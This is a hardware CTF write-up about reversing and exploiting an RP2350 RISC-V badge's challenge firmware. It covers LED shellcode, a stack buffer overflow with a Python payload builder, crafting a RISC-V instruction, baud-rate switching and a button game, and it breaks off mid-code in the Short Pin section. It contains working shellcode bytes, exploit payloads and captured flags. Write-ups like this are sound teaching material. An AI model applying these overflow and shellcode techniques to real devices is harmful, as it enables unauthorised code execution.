# **First** Winner: **@mrexodia** (Duncan Ogilvie)

# HCON 2026 Hardware CTF Writeup 

IDA SCRIPT SUPPORT FOR RISCV RP2350 by @mrexodia: [stuff/riscv_zcb_ida.py](stuff/riscv_zcb_ida.py)

# Initial research

Page with CTF description: https://www.h-c0n.com/2025/12/ctf-badge-hc0n2026.html

Look at the markings on the board. Search for `lckfb-team mod ColorEasyPico2-RP2350A`
- https://oshwlab.com/lckfb-team/coloreasypicox, appears to be modified although most of the components seem the same.
- SVD: https://github.com/raspberrypi/pico-sdk/blob/master/src/rp2350/hardware_regs/RP2350.svd

The other board `YD-RP2040 2022-v1.3` appears to be unmodified:
- https://circuitpython.org/board/vcc_gnd_yd_rp2040/
- https://github.com/initdc/YD-RP2040
- SVD: https://github.com/raspberrypi/pico-sdk/blob/master/src/rp2040/hardware_regs/RP2040.svd

IDA UF2 loader: https://github.com/kjcolley7/UF2-IDA-Loader

CMSIS-SVD repository: https://github.com/cmsis-svd/cmsis-svd-data

Dump the firmware:

```
$ ./picotool.exe info
Program Information
 name:          hello_usb
 binary start:  0x10000000
 binary end:    0x10008724
 target chip:   RP2350
 image type:    RISC-V
$ ./picotool.exe save -a hello_usb.bin -t bin
```

Set up the firmware in IDA by creating the right segments and copying the ROM to RAM match segments according to the copy_table.

# Reversing

Generally browsing the code in IDA and renaming important functions.

# Solutions

## Put LED On

First challenge I tried. At 200018FC we can see the function `challenge_led` which reads some bytes (shellcode). The goal is to turn on the LED which is at GPIO25.

RAM:20001A92 B7 17 03 20                 li              a5, led_payload_dest
RAM:20001A92 93 87 07 BC
RAM:20001A9A 82 97                       jalr            a5 # led_payload_dest
RAM:20001A9C 69 BD                       j               loc_20001936 ; jump to shellcode (copied in 20030BC0)

For a quick test we can run the `ret` instruction by entering `82 80`. It works with spaces, without spaces we get a coredump so be careful.

At startup we can see the LED flash:

// 20001CD4
  pin_reset(25);
  pin_mode(25, 1);
  for ( i = 0; i <= 4; ++i )
  {
    pin_set(25, 1);
    delay(200u);
    pin_set(25, 0);
    delay(200u);
  }
  pin_reset(25);

There is a `pin_reset(25)` which means we need to set the mode and then set the pin high ourselves.

We can write some assembly and assemble it online because I was too lazy to configure the toolchain: https://riscvasm.lucasteske.dev/#

```
.global _boot
.text

_boot:
    li a1, 1
    li a0, 0x19
    lui t0, 0x20000
    addi t0, t0, 0x158 /* t0 = 20000158 (pin_mode) */
    jalr ra, 0(t0)
    
    li a1, 1
    li a0, 0x19
    lui t0, 0x20000
    addi t0, t0, 0xDA /* t0 = 200000DA (pin_set) */
    jalr x0, 0(t0) /* tail call 8 */
```

93 05 10 00 13 05 90 01 b7 02 00 20 93 82 82 15 e7 80 02 00 93 05 10 00 13 05 90 01 b7 02 00 20 93 82 a2 0d 67 80 02 00

Shellcode could be optimized with some `.org` and other hacks, but it works and we get the flag:

99973289796546723708751333036220991736159661059352

## Dear X: Or B0F

Challenge at 20000352:

```c
void __noreturn challenge_b0f()
{
  _BYTE *v0; // a5
  int v1; // a1
  int v2; // a2
  char v3; // a3
  _BYTE v4[256]; // [sp+Ch] [-134h] BYREF
  int v5; // [sp+10Ch] [-34h] BYREF
  int v6; // [sp+110h] [-30h] BYREF
  unsigned __int8 xor_key[4]; // [sp+114h] [-2Ch]
  char first_byte; // [sp+11Bh] [-25h]
  unsigned int k; // [sp+11Ch] [-24h]
  int identical_count; // [sp+120h] [-20h]
  unsigned int j; // [sp+124h] [-1Ch]
  char *i; // [sp+128h] [-18h]
  int v13; // [sp+12Ch] [-14h]

  puts((int)"\r\n"
            "Rules:\r\n"
            " - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.\r\n"
            " - Classic Stack Buffer Overflow challenge.\r\n"
            " - After sending the data, the device will process it and check for validity.\r\n"
            " - You must understand how to generate the payload to overflow the stack and redirect execution to the solve"
            "d() function.\r\n"
            " - You cannot use this challenge to solve others, you are only allowed to return to the solved() function.\r"
            "\n"
            " - Obtaining flags directly by reverse engineering the flag-obfuscation mechanism/flag-algorithm or executin"
            "g code in unintended areas is strictly prohibited. This would be too easy, and I chose not to invest time in"
            " hardening the firmware security. This is a challenge meant for learning and having fun.\r\n"
            " - You must understand how a stack buffer overflow works on RISCV RP2350.\r\n"
            " - You are not allowed to use this challenge to solve other CTF challenges.\r\n"
            " - You must demonstrate in your write-up how you solved the challenge and what you learned.\r\n"
            " - If you violate the rules, you will be disqualified from the CTF.\r\n"
            " - Check the main rules for more help & more details.\r\n"
            "Good luck!\r\n"
            "\r");
  printf("Starting dear x: or b0f challenge... you must execute: 0x%08X\r\n", b0f_solve);
  while ( 1 )
  {
    while ( 1 )
    {
      puts((int)"Enter 32 hex bytes (e.g. 69 69 ...) + CR+LF:\r");
      read_char(*((_DWORD *)off_2002FD60 + 1));
      read_char(*((_DWORD *)off_2002FD60 + 2));
      if ( sub_20012852(v4, 256, *((_DWORD **)off_2002FD60 + 1)) )
        break;
      puts((int)"Input error, try again.\r");
    }
    v13 = 0;
    for ( i = v4; *i && v13 <= 31; i += v5 )
    {
      while ( *i && (*i == ' ' || *i == '\t' || *i == '\r' || *i == '\n') )
        ++i;
      if ( !*i || sscanf(i, "%x%n", &v6, &v5) != 1 )
        break;
      v0 = &g_b0f_20030750[v13++];
      *v0 = v6;
    }
    if ( v13 == 32 )
      break;
    printf("Parsed %d bytes, need %d. Retry.\r\n", v13, 32);
  }
  printf("Received %d bytes. Proceeding...\r\n", 32);
  *(_DWORD *)xor_key = dword_2002FD50;
  for ( j = 0; j <= 0x1E; ++j )
    g_b0f_20030750[j] ^= *((_BYTE *)&j + (int)j % 4 - 16);
  first_byte = g_b0f_20030750[0];
  identical_count = 0;
  for ( k = 0; k <= 0x1E; ++k )
  {
    if ( first_byte == g_b0f_20030750[k] )
      ++identical_count;
  }
  if ( identical_count <= 26 )
  {
    while ( 1 )
    {
      printf("Invalid input data. Expected more identical bytes. Got %d identical bytes.\r\n", identical_count);
      delay(0x3E8u);
    }
  }
  setup_trap_handler();
  b0f_unk((int)b0f_solve, v1, v2, v3);
  while ( 1 )
  {
    puts((int)"bye!\r");
    delay(0x3E8u);
  }
}
```

The decompilation is kind of broken, but looks like we need to enter 32 bytes exactly (again separated by spaces). There are some constraints we need 26 identical bytes which makes it a bit more annoying to guess the return address offset.

If we enter:

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

We see:

```
Invalid input data. Expected more identical bytes. Got 8 identical bytes.
```

This means the description is misleading us and something is going on. After some investigation it turns out the `g_b0f_20030750` is not constructed directly from our bytes but instead from:

```
RAM:2002FD50 14 8A 59 D0 dword_2002FD50: .word 0D0598A14h        # DATA XREF: challenge_b0f+168↑r
```

We XOR the bytes entered with `14 8A 59 D0` so to get buffer full of `00` we need to construct it:

```python
def transform(data: bytes) -> bytes:
  result = bytearray(data)
  key = b"\x14\x8a\x59\xD0"
  for i in range(len(result)):
    result[i] ^= key[i % 4]
  return bytes(result)
```

After sending the transformed 32 null bytes `14 8a 59 d0 14 8a 59 d0 14 8a 59 d0 14 8a 59 d0 14 8a 59 d0 14 8a 59 d0 14 8a 59 d0 14 8a 59 d0`:

```
x26/s10    = 0x00000000  x27/s11    = 0x00000000
x28/t3     = 0x00000009  x29/t4     = 0x00000019
x30/t5     = 0x2002fab0  x31/t6     = 0x2001ea5c

=== STACK DUMP ===
Stack Pointer (sp) = 0x20080cc0

Stack from sp-64 to sp+64:
0x20080c80: 00000000 00000001 20080ca4 00000009 
0x20080c90: 00001808 00400268 20080e40 20000e44 
0x20080ca0: 00000000 00000000 00000000 00000100 
0x20080cb0: 20080cbc 2002b000 0088f0ba 00000000 
0x20080cc0: 00981ce0 00000000 2002b4f8 2002b500  <-- SP
0x20080cd0: 2002b508 2002b510 2002b518 2002b520 
0x20080ce0: 2002b528 2002b530 2002b538 2002b544 
0x20080cf0: 2002b54c 2002b554 2002b55c 2002b564 
0x20080d00: 2002b56c 2002b574 2002b57c 2002b584 

=== CODE DUMP ===
Program Counter (mepc) = 0x00000000
WARNING: Program counter is outside valid memory range!
Cannot dump code memory.
*** END TRAP ***
```

The most difficult part as usual was to figure out that 2001302C is `memcpy`, but after this it is quite clear what is going on:

We call `b0f_unk` with the pointer to the solve function in `a0`:

```
RAM:200005E0 EF 00 50 33                 jal             setup_trap_handler
RAM:200005E4 B7 07 00 20                 lui             a5, %hi(b0f_solve)
RAM:200005E8 13 85 67 2A                 addi            a0, a5, %lo(b0f_solve) # solve
RAM:200005EC 2D 3B                       jal             b0f_unk
```

From there the buffer overflow is set up:

```
RAM:20000326             # int b0f_unk(void *solve)
RAM:20000326             b0f_unk:                                # CODE XREF: challenge_b0f+29A↓p
RAM:20000326
RAM:20000326             var_1C          = -1Ch
RAM:20000326             exploitme       = -0Ch
RAM:20000326             var_s0          =  0
RAM:20000326             var_s4          =  4
RAM:20000326             arg_0           =  8
RAM:20000326
RAM:20000326 79 71                       addi            sp, sp, -30h
RAM:20000328 06 D6                       sw              ra, 28h+var_s4(sp)
RAM:2000032A 22 D4                       sw              s0, 28h+var_s0(sp)
RAM:2000032C 00 18                       addi            s0, sp, 28h+arg_0
RAM:2000032E 23 2E A4 FC                 sw              a0, -8+var_1C(s0)
RAM:20000332 B7 47 41 41                 li              a5, 41414141h
RAM:20000332 93 87 17 14
RAM:2000033A 23 26 F4 FE                 sw              a5, -8+exploitme(s0)
RAM:2000033E 93 07 C4 FE                 addi            a5, s0, -8+exploitme
RAM:20000342 3E 85                       mv              a0, a5  # exploitme
RAM:20000344 D1 37                       jal             b0f_unk2
RAM:20000346 85 47                       li              a5, 1
RAM:20000348 3E 85                       mv              a0, a5
RAM:2000034A B2 50                       lw              ra, 28h+var_s4(sp)
RAM:2000034C 22 54                       lw              s0, 28h+var_s0(sp)
RAM:2000034E 45 61                       addi            sp, sp, 30h # '0'
RAM:20000350 82 80                       ret
RAM:20000350             # End of function b0f_unk
```

With a few layers to complicate the stack layout:

```
RAM:20000308
RAM:20000308             # =============== S U B R O U T I N E =======================================
RAM:20000308
RAM:20000308             # Attributes: bp-based frame fpd=0FFFFFFF8h
RAM:20000308
RAM:20000308             # int __fastcall b0f_unk2(_BYTE *)
RAM:20000308             b0f_unk2:                               # CODE XREF: b0f_unk+1E↓p
RAM:20000308
RAM:20000308             var_C           = -0Ch
RAM:20000308             var_s0          =  0
RAM:20000308             var_s4          =  4
RAM:20000308             arg_0           =  8
RAM:20000308
RAM:20000308 01 11                       addi            sp, sp, -20h
RAM:2000030A 06 CE                       sw              ra, 18h+var_s4(sp)
RAM:2000030C 22 CC                       sw              s0, 18h+var_s0(sp)
RAM:2000030E 00 10                       addi            s0, sp, 18h+arg_0
RAM:20000310 23 26 A4 FE                 sw              a0, -8+var_C(s0)
RAM:20000314 03 25 C4 FE                 lw              a0, -8+var_C(s0)
RAM:20000318 D9 37                       jal             b0f_unk3
RAM:2000031A 89 47                       li              a5, 2
RAM:2000031C 3E 85                       mv              a0, a5
RAM:2000031E F2 40                       lw              ra, 18h+var_s4(sp)
RAM:20000320 62 44                       lw              s0, 18h+var_s0(sp)
RAM:20000322 05 61                       addi            sp, sp, 20h # ' '
RAM:20000324 82 80                       ret
RAM:20000324             # End of function b0f_unk2
```

And finally the vulnerable code:

```
RAM:200002DE             # =============== S U B R O U T I N E =======================================
RAM:200002DE
RAM:200002DE             # Attributes: bp-based frame fpd=0FFFFFFF8h
RAM:200002DE
RAM:200002DE             # int __fastcall b0f_unk3(_BYTE *exploitme)
RAM:200002DE             b0f_unk3:                               # CODE XREF: b0f_unk2+10↓p
RAM:200002DE
RAM:200002DE             var_C           = -0Ch
RAM:200002DE             var_s0          =  0
RAM:200002DE             var_s4          =  4
RAM:200002DE             arg_0           =  8
RAM:200002DE
RAM:200002DE 01 11                       addi            sp, sp, -20h
RAM:200002E0 06 CE                       sw              ra, 18h+var_s4(sp)
RAM:200002E2 22 CC                       sw              s0, 18h+var_s0(sp)
RAM:200002E4 00 10                       addi            s0, sp, 18h+arg_0
RAM:200002E6 23 26 A4 FE                 sw              a0, -8+var_C(s0)
RAM:200002EA 7D 46                       li              a2, 1Fh
RAM:200002EC B7 07 03 20                 lui             a5, %hi(g_b0f_20030750)
RAM:200002F0 93 85 07 75                 addi            a1, a5, %lo(g_b0f_20030750)
RAM:200002F4 03 25 C4 FE                 lw              a0, -8+var_C(s0)
RAM:200002F8 EF 20 51 53                 jal             memcpy
RAM:200002FC 8D 47                       li              a5, 3
RAM:200002FE 3E 85                       mv              a0, a5
RAM:20000300 F2 40                       lw              ra, 18h+var_s4(sp)
RAM:20000302 62 44                       lw              s0, 18h+var_s0(sp)
RAM:20000304 05 61                       addi            sp, sp, 20h # ' '
RAM:20000306 82 80                       ret
RAM:20000306             # End of function b0f_unk3
```

To recap:

```c
int __fastcall b0f_unk3(_BYTE *exploitme)
{
  memcpy(exploitme, g_b0f_20030750, 31u);
  return 3;
}

int __fastcall b0f_unk2(_BYTE *a1)
{
  b0f_unk3(a1);
  return 2;
}

int b0f_unk(void *solve)
{
  _DWORD exploitme[3]; // [sp+1Ch] [-14h] BYREF

  exploitme[0] = 'AAAA';
  b0f_unk2(exploitme);
  return 1;
}
```

We control `g_b0f_20030750`, which means we can overwrite the `AAAA` and then the return address.

Stack frame:

```
-0000000000000028 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000028 // Frame size: 28; Saved regs: 8; Purge: 0
-0000000000000028
-0000000000000028     // padding byte
-0000000000000027     // padding byte
-0000000000000026     // padding byte
-0000000000000025     // padding byte
-0000000000000024     // padding byte
-0000000000000023     // padding byte
-0000000000000022     // padding byte
-0000000000000021     // padding byte
-0000000000000020     // padding byte
-000000000000001F     // padding byte
-000000000000001E     // padding byte
-000000000000001D     // padding byte
-000000000000001C     _DWORD var_1C;
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     // padding byte
-0000000000000013     // padding byte
-0000000000000012     // padding byte
-0000000000000011     // padding byte
-0000000000000010     // padding byte
-000000000000000F     // padding byte
-000000000000000E     // padding byte
-000000000000000D     // padding byte
-000000000000000C     _BYTE exploitme[12];
+0000000000000000     _DWORD var_s0;
+0000000000000004     _DWORD var_ra;
+0000000000000008     _BYTE arg_0;
```

The `var_ra` is what we need to overwrite (`ra` is the return register) since they get restored in the epilog:

```
RAM:2000034A B2 50                       lw              ra, 28h+var_ra(sp)
RAM:2000034C 22 54                       lw              s0, 28h+var_s0(sp)
RAM:2000034E 45 61                       addi            sp, sp, 30h # '0'
RAM:20000350 82 80                       ret
```

So that means our exploit should be:

```python
solve_addr = 0x200002A6.to_bytes(4, byteorder="little")
payload = b"\x69" * 16 + solve_addr + b"\x69" * 12
print(transform(payload).hex(" "))
```

Some mistakes I made:
- Forgot `byteorder="little"`
- Put the `solve_addr` in `var_s0` instead of `var_ra`
- Use `00` as the repeating byte, `69` is better to debugging

We get the flag: `64234839333817747434800016443888054149478786635377`

## Risky Payload

Decompilation after some cleaning:

```c
void __noreturn challenge_riscky_payload()
{
  unsigned __int8 payload[11]; // [sp+4h] [-1Ch] BYREF

  *(_DWORD *)payload = 0xFE842783;
  *(_DWORD *)&payload[4] = 0x3F3F3F3F;
  *(_WORD *)&payload[8] = 0x9782;
  payload[10] = 0;
  puts((int)"\r\n"
            "Rules:\r\n"
            " - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.\r\n"
            " - You must craft a special 32-bit RISC-V instruction.\r\n"
            " - The instruction must set register ?? to the magic value.\r\n"
            " - After sending the data, the device will validate the instruction.\r\n"
            " - You must understand RISC-V instruction encoding.\r\n"
            " - The payload will execute your instruction and call solve_this().\r\n"
            " - Obtaining flags directly by reverse engineering the flag-obfuscation mechanism/flag-algorithm or executin"
            "g code in unintended areas is strictly prohibited. This would be too easy, and I chose not to invest time in"
            " hardening the firmware security. This is a challenge meant for learning and having fun.\r\n"
            " - You must demonstrate in your write-up how you solved the challenge and what you learned.\r\n"
            " - If you violate the rules, you will be disqualified from the CTF.\r\n"
            " - Check the main rules for more help & more details.\r\n"
            "Good luck!\r\n"
            "\r");
  puts((int)"Starting riscky payvload challenge...\r");
  puts((int)"Enter 4 bytes hex values to append to payload: (ex: 69 69 69 69)\r");
  read_char(*((_DWORD *)off_2002FD60 + 1));
  read_char(*((_DWORD *)off_2002FD60 + 2));
  scanf("%2hhx %2hhx %2hhx %2hhx", &payload[4], &payload[5], &payload[6], &payload[7]);
  if ( !payload_check(&payload[4]) )
  {
    while ( 1 )
    {
      puts((int)"Payload check failed!\r");
      delay(0x3E8u);
    }
  }
  puts((int)"Payload check passed!\r");
  payload_exec((int (*)(void))payload);
  while ( 1 )
  {
    puts((int)"Hello, world!\r");
    delay(0x3E8u);
  }
}
```

Mean trick was to merge the `payload` variable. The data originally comes from here:

```
RAM:2002A3C8             # const int dword_2002A3C8
RAM:2002A3C8 83 27 84 FE dword_2002A3C8: .word 0FE842783h        # DATA XREF: challenge_riscky_payload+8↑o
RAM:2002A3C8                                                     # challenge_riscky_payload+10↑r
RAM:2002A3CC             # const int dword_2002A3CC
RAM:2002A3CC 3F 3F 3F 3F dword_2002A3CC: .word 3F3F3F3Fh         # DATA XREF: challenge_riscky_payload+16↑r
RAM:2002A3D0             # const __int16 word_2002A3D0
RAM:2002A3D0 82 97       word_2002A3D0:  .half 9782h             # DATA XREF: challenge_riscky_payload+1C↑r
RAM:2002A3D2             # const char byte_2002A3D2
RAM:2002A3D2 00          byte_2002A3D2:  .byte 0                 # DATA XRE
```

That means the data of the payload is `83 27 84 FE ?? ?? ?? ?? 82 97 00`.

The challenge says to create a valid instruction so we can perform some disassembly by manually marking the data as code:

```
RAM:2002A3C8 83 27 84 FE lw              a5, -18h(s0)
RAM:2002A3CC 3F 3F 3F 3F .word 3F3F3F3Fh ; our goal is to fill this in
RAM:2002A3D0 82 97       jalr            a5
```

If we decompile the `payload_check` it is quite difficult to read initially:

```c
BOOL __fastcall payload_check(unsigned __int8 *a1)
{
  unsigned int v3; // [sp+1Ch] [-14h]

  if ( !a1 )
    return 0;
  v3 = (a1[3] << 24) | *a1 | (a1[1] << 8) | (a1[2] << 16);
  if ( (*a1 & 0x7F) != 0x13 )
    return 0;
  if ( ((v3 >> 12) & 7) != 0 )
    return 0;
  return ((v3 >> 15) & 0x1F) == 0;
}
```

But with some help from the reference (https://www.cs.cornell.edu/courses/cs3410/2025fa/rsrc/riscv-instructions-2.html) and the data types https://github.com/thesecretclub/riscy-business/blob/master/riscvm/riscvm.h#L100:

```c
BOOL __fastcall payload_check(unsigned __int8 *a1)
{
  unsigned int v3; // [sp+1Ch] [-14h]

  if ( !a1 )
    return 0;
  v3 = (a1[3] << 24) | *a1 | (a1[1] << 8) | (a1[2] << 16);// v3 = bswap(instruction)
  if ( (*a1 & 0x7F) != 0x13 )                   // opcode == 0x13 (001 0011, i-type)
    return 0;
  //     struct
  //     {
  //         uint32_t opcode : 7; // (v3 >> 0) & 0x7F
  //         uint32_t rd     : 5; // (v3 >> 7) & 0x1F
  //         uint32_t funct3 : 3; // (v3 >> 12) & 0x7
  //         uint32_t rs1    : 5; // (v3 >> 15) & 0x1F
  //         uint32_t imm    : 12; // (v3 >> 20) & 0xFFF
  //     } itype;
  if ( ((v3 >> 12) & 7) != 0 )                  // funct3 == 0
    return 0;
  return ((v3 >> 15) & 0x1F) == 0;              // rs1 == 0 => addi rd, rs1, imm
}
```

Now we know that we need to assemble:

```
addi rd, rs1, imm
```

But we do not know `rs1` or `rd` yet.

```
RAM:20000668 79 71                       addi            sp, sp, -30h
RAM:2000066A 06 D6                       sw              ra, 28h+var_s4(sp)
RAM:2000066C 22 D4                       sw              s0, 28h+var_s0(sp)
RAM:2000066E 00 18                       addi            s0, sp, 28h+arg_0
RAM:20000670 23 2E A4 FC                 sw              a0, -8+var_1C(s0)
RAM:20000674 83 27 C4 FD                 lw              a5, -8+var_1C(s0)
RAM:20000678 23 26 F4 FE                 sw              a5, -8+var_C(s0)
RAM:2000067C B7 07 00 20                 li              a5, riscy_solve
RAM:2000067C 93 87 47 60
RAM:20000684 23 24 F4 FE                 sw              a5, -8+var_10(s0)
RAM:20000688 EF 00 D0 28                 jal             setup_trap_handler
RAM:2000068C 83 27 C4 FE                 lw              a5, -8+var_C(s0)
RAM:20000690 82 97                       jalr            a5
RAM:20000692 01 00                       nop
RAM:20000694 B2 50                       lw              ra, 28h+var_s4(sp)
RAM:20000696 22 54                       lw              s0, 28h+var_s0(sp)
RAM:20000698 45 61                       addi            sp, sp, 30h # '0'
RAM:2000069A 82 80                       ret
```

Here we can see that `a5` is set to `riscy_solve` (20000668):

```c
void __fastcall __noreturn riscy_solve(unsigned __int8 a1)
{
  char v2[264]; // [sp+10h] [-110h] BYREF

  if ( a1 == 105 )
  {
    while ( 1 )
    {
      sub_200001E6(1, (int)v2, 0x100u);
      printf("Solved! riscky payvload -> flag: %s\r\n", v2);
      delay(0x3E8u);
    }
  }
  while ( 1 )
  {
    printf("Wrong magic byte: 0x%02X\r\n", a1);
    delay(0x3E8u);
  }
}
```

This means we need to set `a0` (first argument) to be equal to `105` after our instruction to solve the challenge.

```
lw              a5, -18h(s0)
addi a0, zero, 105
jalr            a5
```

The insight is that we can use the `zero` register to set `a0` to a constant using the `addi` instruction.

Bytes: `13 05 90 06`

Flag: `15271170802268925524715374920035979746052491029012`

## Crazy Baud Rates

Decompilation:

```c
void __noreturn challenge_crazy_baud()
{
  char v0[128]; // [sp+0h] [-1C0h] BYREF
  char a2[256]; // [sp+80h] [-140h] BYREF
  _DWORD baud_rates[4]; // [sp+180h] [-40h]
  int v3; // [sp+190h] [-30h]
  unsigned int v4; // [sp+194h] [-2Ch]
  unsigned int v5; // [sp+198h] [-28h]
  unsigned int v6; // [sp+19Ch] [-24h]
  unsigned int v7; // [sp+1A0h] [-20h]
  int i; // [sp+1A4h] [-1Ch]
  int v9; // [sp+1A8h] [-18h]
  unsigned __int8 v10; // [sp+1AFh] [-11h]

  puts((int)"\r\n"
            "Rules:\r\n"
            " - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.\r\n"
            " - You must use your intuition and the challenge name, or reverse engineer the code to understand what to do"
            ".\r\n"
            " - You must understand serial communication and baud rate configuration.\r\n"
            " - Obtaining flags directly by reverse engineering the flag-obfuscation mechanism/flag-algorithm or executin"
            "g code in unintended areas is strictly prohibited. This would be too easy, and I chose not to invest time in"
            " hardening the firmware security. This is a challenge meant for learning and having fun.\r\n"
            " - You must demonstrate in your write-up how you solved the challenge and what you learned.\r\n"
            " - If you violate the rules, you will be disqualified from the CTF.\r\n"
            " - Check the main rules for more help & more details.\r\n"
            "Good luck!\r\n"
            "\r");
  puts((int)"CHALLENGE: Crazy baud rates!\r");
  v5 = sub_20000196(56);
  v4 = v5 >> 2;
  baud_rates[0] = 19200;
  baud_rates[1] = 9600;
  baud_rates[2] = 38400;
  baud_rates[3] = 115200;
  v10 = 0;
  v9 = dword_20030C58;
  while ( 1 )
  {
    if ( v9 != dword_20030C58 )
    {
      v9 = dword_20030C58;
      for ( i = 0; ; ++i )
      {
        if ( i > 3 )
          goto sleep;
        if ( baud_rates[i] == dword_20030C58 && ((v10 >> i) & 1) == 0 )
          break;
      }
      v3 = v4 * i;
      if ( i == 3 )
        v7 = v5;
      else
        v7 = v4 + v3;
      v6 = v7 - v3;
      if ( v7 - v3 > 0x7F )
        v6 = 127;
      get_flag(56u, a2, 256u);
      memcpy(v0, &a2[v3], v6);
      v0[v6] = 0;
      printf("Part %d (@%u baud): %s\r\n", i + 1, dword_20030C58, v0);
      v10 |= 1 << i;
    }
sleep:
    delay(200u);
  }
}
```

Main part was marking the baud rates as const to propagate:

```
AM:2002B16C             # const int g_baud_19200
RAM:2002B16C 00 4B 00 00 g_baud_19200:   .word 19200             # DATA XREF: challenge_crazy_baud+3A↑o
RAM:2002B16C                                                     # challenge_crazy_baud+42↑r
RAM:2002B170             # const int g_baud_9600
RAM:2002B170 80 25 00 00 g_baud_9600:    .word 9600              # DATA XREF: challenge_crazy_baud+44↑r
RAM:2002B174             # const int g_baud_38400
RAM:2002B174 00 96 00 00 g_baud_38400:   .word 38400             # DATA XREF: challenge_crazy_baud+46↑r
RAM:2002B178             # const int g_baud_115200
RAM:2002B178 00 C2 01 00 g_baud_115200:  .word 115200            # DATA XREF: c
```

Solution is to switch the baud rates in the Arduino serial monitor:

```
CHALLENGE: Crazy baud rates!
Part 1 (@19200 baud): 316842687151
Part 2 (@9600 baud): 917354860954
Part 3 (@38400 baud): 601066663426
Part 4 (@115200 baud): 87038005162305
```

## The Switch Pattern Game

Decompilation:

```c
void challenge_switch_pattern()
{
  char v0[256]; // [sp+0h] [-130h] BYREF
  int m; // [sp+100h] [-30h]
  char v2; // [sp+107h] [-29h]
  int k; // [sp+108h] [-28h]
  int j; // [sp+10Ch] [-24h]
  int i; // [sp+110h] [-20h]
  char v6; // [sp+117h] [-19h]
  int round; // [sp+118h] [-18h]
  int score; // [sp+11Ch] [-14h]

  if ( g_challenge_switch == 1 )
  {
    puts((int)"\r\n"
              "Rules:\r\n"
              " - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.\r\n"
              " - You must test your reflexes in this pattern-matching game.\r\n"
              " - Complete 10 rounds without mistakes to win.\r\n"
              " - You can solve this challenge using your intuition or by reverse engineering to understand what you need"
              " to do.\r\n"
              " - You are not allowed to obtain the flag directly through reverse engineering / debugging.\r\n"
              " - You must demonstrate in your write-up how you solved the challenge and what you learned.\r\n"
              " - If you violate the rules, you will be disqualified from the CTF.\r\n"
              " - Check the main rules for more help & more details.\r\n"
              "Good luck!\r\n"
              "\r");
    while ( 1 )
    {
      while ( 1 )
      {
        pin_reset(25);
        pin_mode(25, 1);
        score = 0;
        puts((int)"\r\n=== THE DREGAME: 10 ROUNDS ===\r");
        round = 1;
LABEL_29:
        if ( round <= 10 )
          break;
        puts((int)"\r\n=== FINAL RESULT ===\r");
        printf("Score: %d/10\r\n", score);
        if ( score == 10 )
        {
          puts((int)"PERFECT! You got them all right!\r");
          while ( 1 )
          {
            get_flag(0x1Eu, v0, 0x100u);
            printf("Flag: %s\r\n", v0);
            delay(0x7D0u);
          }
        }
        if ( score <= 6 )
        {
          if ( score <= 4 )
            puts((int)"You need more practice...\r");
          else
            puts((int)"Not bad, but you can improve!\r");
        }
        else
        {
          puts((int)"Very good! Almost perfect!\r");
        }
        puts((int)"\r\nGame over\r");
      }
      printf("Round %d/10: Get ready...\r\n", round);
      v6 = 0;
      for ( i = 0; i <= 9; ++i )
      {
        pin_set(25, 1);
        for ( j = 0; ; ++j )
        {
          if ( j > 9 )
            goto LABEL_10;
          if ( check_boot_button() )
            break;
          delay(10u);
        }
        v6 = 1;
LABEL_10:
        pin_set(25, 0);
        for ( k = 0; ; ++k )
        {
          if ( k > 9 )
            goto LABEL_15;
          if ( check_boot_button() )
            break;
          delay(0xAu);
        }
        v6 = 1;
LABEL_15:
        if ( v6 )
          break;
      }
      if ( !v6 )
      {
        pin_set(25, 1);
        v2 = 0;
        for ( m = 0; ; ++m )
        {
          if ( m > 99 )
            goto LABEL_25;
          if ( check_boot_button() )
            break;
          delay(0x64u);
        }
        v2 = 1;
LABEL_25:
        pin_set(25, 0);
        if ( v2 )
        {
          puts((int)"Well done!\r\n\r");
          ++score;
        }
        else
        {
          puts((int)"You missed!\r\n\r");
        }
        delay(0x3E8u);
        ++round;
        goto LABEL_29;
      }
      pin_set(25, 0);
      puts((int)"GAME OVER - You lose!\r");
      printf("Final score: %d/10\r\n", round - 1);
    }
  }
}
```

Solution requires manually pressing the BOOT button after the initial 10 blinks of the LED in succession:

```
ENTER CHALLENGE: 
ENTER CHALLENGE:  t

Rules:
 - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.
 - You must test your reflexes in this pattern-matching game.
 - Complete 10 rounds without mistakes to win.
 - You can solve this challenge using your intuition or by reverse engineering to understand what you need to do.
 - You are not allowed to obtain the flag directly through reverse engineering / debugging.
 - You must demonstrate in your write-up how you solved the challenge and what you learned.
 - If you violate the rules, you will be disqualified from the CTF.
 - Check the main rules for more help & more details.
Good luck!


=== THE DREGAME: 10 ROUNDS ===
Round 1/10: Get ready...
Well done!

Round 2/10: Get ready...
Well done!

Round 3/10: Get ready...
Well done!

Round 4/10: Get ready...
Well done!

Round 5/10: Get ready...
Well done!

Round 6/10: Get ready...
Well done!

Round 7/10: Get ready...
Well done!

Round 8/10: Get ready...
Well done!

Round 9/10: Get ready...
Well done!

Round 10/10: Get ready...
Well done!


=== FINAL RESULT ===
Score: 10/10
PERFECT! You got them all right!
Flag: 39557421011648410282707920923516107127272224790239
```

## Short Pin

```c
void __noreturn challenge_short_pin()
{
  char v0[256]; // [sp+8h] [-118h] BYREF
  int i; // [sp+108h] [-18h]
  char v2; // [sp+10Fh] [-11h]

  pin_reset(2);
  pin_mode(2, 0);
  sub_2000004A(2);
  puts((int)"\r\n"
            "Rules:\r\n"
            " - The objective of this CTF is not to obtain the flag, but to learn in depth what you are doing.\r\n"
            " - You must short a GPIO to win.\r\n"
            " - Using your house key might help ;-)\r\n"
            " - You can use your intuition and the challenge name, or reverse engineer the code to understand what to do."
            "\r\n"
            " - Obtaining flags directly by reverse engineering the flag-obfuscation mechanism/flag-algorithm or executin"
            "g code in unintended areas is strictly prohibited. This would be too easy, and I chose not to invest time in"
            " hardening the firmware security. This is a challenge meant for learning and having fun.\r\n"
            " - You must demonstrate in your write-up how you solved the challenge and what you learned.\r\n"
            " - If you violate the rules, you will be disqualified from the CTF.\r\n"
            " - Check the main rules for more help & more details.\r\n"
            "Good luck!\r\n"
            "\r");
  while ( 1 )
